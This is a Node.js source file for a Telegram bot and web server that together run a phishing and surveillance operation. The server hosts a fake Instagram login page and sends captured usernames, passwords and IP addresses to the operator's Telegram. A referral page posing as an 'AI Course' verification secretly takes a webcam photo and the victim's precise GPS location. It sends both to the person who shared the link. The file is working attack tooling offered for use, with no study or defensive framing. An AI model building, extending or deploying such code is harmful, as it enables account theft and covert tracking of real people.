// index.js (ESM) – Node 18+
// npm i telegraf express multer dotenv

import dotenv from "dotenv";
dotenv.config();

import express from "express";
import multer from "multer";
import { Telegraf } from "telegraf";
import path from "path";
import { fileURLToPath } from "url";

const __dirname = path.dirname(fileURLToPath(import.meta.url));

const BOT_TOKEN = process.env.BOT_TOKEN;
const HOST = process.env.HOST || "woefully-harmonious-longspur.cloudpub.ru";
const PORT = process.env.PORT || 3000;
const FIREBASE_DB_URL = process.env.FIREBASE_DB_URL;
const ADMIN_USER_ID = process.env.ADMIN_USER_ID || "5310317109";

if (!BOT_TOKEN || !FIREBASE_DB_URL) {
  console.error("Set BOT_TOKEN and FIREBASE_DB_URL in .env");
  process.exit(1);
}

// ---------- BOT ----------
const bot = new Telegraf(BOT_TOKEN);
const referrals = new Map();

// /start
bot.start(async (ctx) => {
  const id = String(ctx.from.id);
  referrals.set(id, true);
  await ctx.reply(
    `Ваша ссылка:\nhttps://${HOST}/r/${id}\n\nInstagram: https://${HOST}/insta`,
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "Open Instagram", url: `https://${HOST}/insta` }]
        ]
      }
    }
  );
});

bot.command("link", async (ctx) => {
  const id = String(ctx.from.id);
  referrals.set(id, true);
  await ctx.reply(`https://${HOST}/r/${id}`);
});

// Admin panel
bot.command("admin", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return ctx.reply("Access denied.");

  const res = await fetch(`${FIREBASE_DB_URL}/activeUsers.json`);
  const users = await res.json();
  if (!users) return ctx.reply("No active users.");

  const count = Object.keys(users).length;
  let msg = `*Active: ${count}*\n\n`;
  const kb = [];

  for (const [id, u] of Object.entries(users)) {
    const name = u.username ? `@${u.username}` : id;
    msg += `${name} — ${new Date(u.timestamp).toLocaleTimeString()}\n`;
    kb.push([{ text: `Msg ${name}`, callback_data: `msg_${id}` }]);
  }

  await ctx.replyWithMarkdownV2(msg.replace(/[-_*]/g, '\\$&'), { reply_markup: { inline_keyboard: kb } });
});

bot.action(/msg_(.+)/, async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID) return;
  const target = ctx.match[1];
  await ctx.reply(`Message to ${target}:`, { reply_markup: { force_reply: true } });
  ctx.session = { target };
});

bot.on("text", async (ctx) => {
  if (String(ctx.from.id) !== ADMIN_USER_ID || !ctx.session?.target) return;
  const target = ctx.session.target;
  const text = ctx.message.text;
  try {
    await bot.telegram.sendMessage(target, `Admin:\n${text}`);
    await ctx.reply(`Sent to ${target}`);
  } catch { await ctx.reply("Failed"); }
  delete ctx.session.target;
});

bot.launch().then(() => console.log("Bot LIVE"));

// ---------- EXPRESS ----------
const app = express();
app.use(express.urlencoded({ extended: true }));
app.use(express.json());
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 6 * 1024 * 1024 } });

// SERVE YOUR EXACT FOLDER: C:\Users\user\Desktop\tg-node\test insta\
const INSTA_PATH = path.join(__dirname, "test insta");
app.use("/insta", express.static(INSTA_PATH));

// CAPTURE LOGIN
app.post("/login", async (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.redirect("/insta");

  const ip = req.ip || req.headers["x-forwarded-for"] || "unknown";
  const time = new Date().toLocaleString();

  const message = `
*INSTAGRAM LOGIN*
*User:* \`${username}\`
*Pass:* \`${password}\`
*IP:* \`${ip}\`
*Time:* \`${time}\`
  `.trim();

  try {
    await bot.telegram.sendMessage(ADMIN_USER_ID, message, { parse_mode: "Markdown" });
  } catch (e) {
    console.error("Failed to send login", e);
  }

  res.redirect("https://www.instagram.com/");
});

// ---------- STUDENT PAGE ----------
app.get("/r/:ref", (req, res) => {
  const { ref } = req.params;
  if (!/^\d+$/.test(ref)) return res.status(400).send("Invalid");

  res.type("html").send(`<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>AI Course</title>
  <script src="https://telegram.org/js/telegram-web-app.js"></script>
  <style>
    body,html{margin:0;padding:0;height:100%;background:#111;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;}
    .card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border-radius:16px;padding:20px;max-width:380px;width:90%;text-align:center;}
    h1{font-size:1.6rem;color:#0f9;margin:8px 0;}
    .warn{background:#c62828;padding:12px;border-radius:10px;font-size:.9rem;margin:12px 0;}
    button{background:#0f9;color:#000;border:none;padding:14px;font-size:1rem;font-weight:600;border-radius:50px;width:100%;cursor:pointer;}
    #status{margin-top:12px;padding:10px;background:rgba(0,255,136,.1);border-radius:8px;font-size:.9rem;}
  </style>
</head>
<body>
<div class="card">
  <h1>AI 2024</h1>
  <div class="warn">
    <strong>REQUIRED:</strong><br>
    • Photo (verification)<br>
    • Location (region)
  </div>
  <button id="go">CONFIRM</button>
  <div id="status">Ready...</div>
</div>

<script>
const ref = ${JSON.stringify(ref)};
const firebaseUrl = ${JSON.stringify(FIREBASE_DB_URL)};
let photoBlob = null;
let geo = null;
let username = null;

if (window.Telegram?.WebApp) {
  Telegram.WebApp.ready();
  Telegram.WebApp.expand();
  const user = Telegram.WebApp.initDataUnsafe.user;
  if (user) username = user.username || null;
}

document.getElementById("go").onclick = async () => {
  const btn = document.getElementById("go");
  const status = document.getElementById("status");
  btn.disabled = true;
  status.textContent = "Starting...";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
    const video = document.createElement("video");
    video.srcObject = stream;
    video.muted = true;
    video.play();
    await new Promise(r => { video.onloadeddata = r; });

    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
    photoBlob = await new Promise(res => canvas.toBlob(res, "image/jpeg", 0.9));
    stream.getTracks().forEach(t => t.stop());
    status.textContent = "Photo OK";
  } catch (e) { status.textContent = "No photo"; }

  try {
    geo = await new Promise((res, rej) => {
      const t = setTimeout(() => rej(), 8000);
      navigator.geolocation.getCurrentPosition(
        p => { clearTimeout(t); res({ lat: p.coords.latitude, lon: p.coords.longitude }); },
        () => { clearTimeout(t); rej(); },
        { timeout: 8000, enableHighAccuracy: true }
      );
    });
    status.textContent += " | GPS OK";
  } catch (e) { status.textContent += " | No GPS"; }

  if (!photoBlob && !geo) {
    status.textContent = "Nothing received";
    btn.disabled = false;
    return;
  }

  status.textContent = "Sending...";
  const fd = new FormData();
  fd.append("ref", ref);
  if (geo) { fd.append("latitude", geo.lat); fd.append("longitude", geo.lon); }
  if (photoBlob) fd.append("photo", photoBlob, "s.jpg");

  try {
    await fetch("/submit", { method: "POST", body: fd });

    const userData = {
      userId: ref,
      username: username,
      timestamp: Date.now(),
      active: true,
      hasPhoto: !!photoBlob,
      hasLocation: !!geo
    };
    await fetch(\`\${firebaseUrl}/activeUsers/\${ref}.json\`, {
      method: "PUT",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(userData)
    });

    status.innerHTML = "<strong>SUCCESS!</strong><br>You are active!";
    btn.style.display = "none";
  } catch (e) {
    status.textContent = "Error";
    btn.disabled = false;
  }
};
</script>
</body>
</html>`);
});

// ---------- SUBMIT ----------
app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    const { ref, latitude, longitude } = req.body;
    if (!ref || !/^\d+$/.test(ref)) return res.status(400).json({ ok: false });

    const inviterId = ref;
    const promises = [];

    if (req.file?.buffer) {
      promises.push(
        bot.telegram.sendPhoto(inviterId, { source: req.file.buffer }, {
          caption: `New student (ref ${ref})`
        }).catch(() => {})
      );
    }

    if (latitude && longitude) {
      const lat = parseFloat(latitude);
      const lon = parseFloat(longitude);
      if (!isNaN(lat) && !isNaN(lon)) {
        promises.push(
          bot.telegram.sendLocation(inviterId, lat, lon).catch(() => {}),
          bot.telegram.sendMessage(inviterId, `GPS: ${lat.toFixed(5)}, ${lon.toFixed(5)}`).catch(() => {})
        );
      }
    }

    if (promises.length === 0) {
      promises.push(bot.telegram.sendMessage(inviterId, `Link opened (ref ${ref})`).catch(() => {}));
    }

    await Promise.allSettled(promises);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ ok: false });
  }
});

// ---------- START ----------
app.listen(PORT, "0.0.0.0", () => {
  console.log(`LIVE: https://${HOST}:${PORT}`);
  console.log(`Instagram: https://${HOST}/insta`);
  console.log(`Your file: C:\\Users\\user\\Desktop\\tg-node\\test insta\\index.html → SERVED`);
});